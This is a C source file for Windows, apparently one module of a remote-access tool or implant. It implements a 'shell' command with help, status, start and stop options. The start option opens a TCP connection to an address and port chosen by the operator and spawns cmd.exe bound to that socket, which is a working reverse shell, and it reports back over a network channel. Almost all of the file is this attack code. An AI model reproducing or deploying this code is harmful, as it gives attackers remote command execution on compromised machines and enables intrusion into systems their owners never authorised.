#include <stdio.h>

#include "command.h"
#include "networking.h"
#include "process.h"
#include "shell.h"
#include "utils.h"

static HANDLE g_hProcess = NULL;
static LPWSTR lpAddress = NULL;
static LPWSTR lpPort = NULL;

// Returns 0 on success, else error.
static void PrintHelp(void) {
	NetSend(L"\t\t.:: SHELL HELP ::.\n\n"
			L"Usage: shell [help|status|start|stop] [address port]\n\n"
			L"\t%-12s:\tDisplay this menu.\n"
			L"\t%-12s:\tChecks the status of the shell.\n"
			L"\t%-12s:\tStarts the shell. Default server is %s:%s.\n"
			L"\t%-12s:\tStops the shell.\n\n"
			L"\n"
			L"\t%-12s:\tSpecify the remote address.\n"
			L"\t%-12s:\tSpecify the remote port.\n"
			L"\nExample:\n"
			L"\t\tshell start 127.0.0.1 45872\n\n",
			OPTION_STRING_HELP,
			OPTION_STRING_STATUS,
			OPTION_STRING_START, SHELL_DEFAULT_ADDRESS, SHELL_DEFAULT_PORT,
			OPTION_STRING_STOP,
			L"address",
			L"port");
}

static void PrintStatus(void) {
	if (g_hProcess == NULL) {
		NetSend(L"\t\t.:: SHELL STATUS ::.\n\n"
				L"\t\tShell is INACTIVE.\n\n");
	} else {
		NetSend(L"\t\t.:: SHELL STATUS ::.\n\n"
				L"\t\tShell is ACTIVE.\n\n"
				L"\t%-12s:\t%s:%s\n"
				L"\t%-12s:\t0x%08x\n\n", 
				L"Remote", lpAddress, lpPort, 
				L"PID", GetProcessId(g_hProcess));
	}
}

static void ShellNetSend(LPCWSTR fmt, ...) {
	WCHAR szBuf[NET_BUF_SIZE + 1];
	va_list args;

	ZeroMemory(szBuf, SIZEOF_ARRAY(szBuf));

	va_start(args, fmt);
	_vswprintf_p(szBuf, SIZEOF_ARRAY(szBuf) - sizeof(WCHAR), fmt, args);

	NetSend(L"%s: %s\n", SHELL_BANNER, szBuf);
}

static BOOL ShellStop(void) {
	BOOL bSuccess = TerminateProcess(g_hProcess, 1);
	if (bSuccess == FALSE) {
		ShellNetSend(L"Failed to terminate shell; error: <%lu>", GetLastError());
	} else {
		ShellNetSend(L"Successfully terminated shell.");
		CloseHandle(g_hProcess);
		g_hProcess = NULL;
	}

	return bSuccess;
}

static void ShellStart(void) {
	SOCKET s = INVALID_SOCKET;
	ULONG uSuccess = TcpConnect(&s, lpAddress, lpPort);
	//do {
		if (uSuccess != 0) {
			ShellNetSend(L"Failed to create a TCP connection; error: %lu", uSuccess);
			if (uSuccess != WSAETIMEDOUT && uSuccess != WSAECONNREFUSED) {
				if (s != INVALID_SOCKET) {
					CloseTcpSocket(s);
					return;
				}
			}
		}
		// TODO Fix sleep?
		//Sleep(5000);
	//} while (uSuccess == WSAETIMEDOUT || uSuccess == WSAECONNREFUSED);

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	// Get directory of cmd.exe
	WCHAR szSysDirectory[MAX_PATH + 1];
	GetSystemDirectory(szSysDirectory, MAX_PATH);

	// Append cmd.exe
	SIZE_T nCmdLen = wcslen(szSysDirectory) + wcslen(CMD_EXE) + 1;
	LPWSTR szCmd = _HeapAlloc(HEAP_ZERO_MEMORY, sizeof(WCHAR) * nCmdLen);
	if (szCmd == NULL) {
		return;
	}
	wcscpy_s(szCmd, nCmdLen, szSysDirectory);
	wcsncat_s(szCmd + wcslen(szCmd), nCmdLen - wcslen(szCmd), CMD_EXE, wcslen(CMD_EXE));

	uSuccess = ProcessCreateInteractiveSocketShell(s, szCmd, L"", &pi);
	if (uSuccess != 0) {
		ShellNetSend(L"CreateInteractiveSocketShellProcess failed; error: %lu", GetLastError());
		goto fail;
	}

	_HeapFree(szCmd);

	g_hProcess = pi.hProcess;
	if (uSuccess == 0) {
		ShellNetSend(L"Successfully spawned shell (PID: <0x%08x>).", GetProcessId(g_hProcess));
	} else {
		ShellNetSend(L"Failed to spawn shell; error: %lu", GetLastError());
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

fail:
	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	if (s != INVALID_SOCKET) {
		CloseTcpSocket(s);
	}

	ShellNetSend(L"Shell has been terminated.");
	// Don't forget to uninitialise after use so it can be set again.
	g_hProcess = NULL;
}

ULONG ShellMain(INT argc, LPWSTR *argv) {
	// Set default address and port.
	lpAddress = SHELL_DEFAULT_ADDRESS;
	lpPort = SHELL_DEFAULT_PORT;

	if (argc == 1) {
		PrintHelp();
	} else if (argc > 1) {
		if (!_wcsnicmp(argv[1], OPTION_STRING_HELP, wcslen(OPTION_STRING_HELP))) {
			PrintHelp();
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_STATUS, wcslen(OPTION_STRING_STATUS))) {
			PrintStatus();
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_START, wcslen(OPTION_STRING_START))) {
			// Check for address and port parameters
			if (argc == 2) {
				goto spawn;
			} else if (argc < 4) {
				// Invalid arguments.
				ShellNetSend(L"Please provide an address and port.");
			} else {
				// Change remote address and port.
				lpAddress = argv[2];
				lpPort = argv[3];
				goto spawn;
			}
		} else if (!_wcsnicmp(argv[1], OPTION_STRING_STOP, wcslen(OPTION_STRING_STOP))) {
			// Check if there's anything to kill.
			if (g_hProcess != NULL) {
				ShellStop();
			} else {
				ShellNetSend(L"Nothing to kill.");
			}
		} else {
			ShellNetSend(L"Bad argument(s).");
		}
	}

	return 0;

spawn:
	if (g_hProcess != NULL) {
		ShellNetSend(L"There is already an active shell process (PID: <0x%08x>).", GetProcessId(g_hProcess));
		return 1;
	}

	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ShellStart, NULL, 0, NULL) == NULL) {
		ShellNetSend(L"Failed to create thread; error: %lu", GetLastError());
	}

	return 0;
}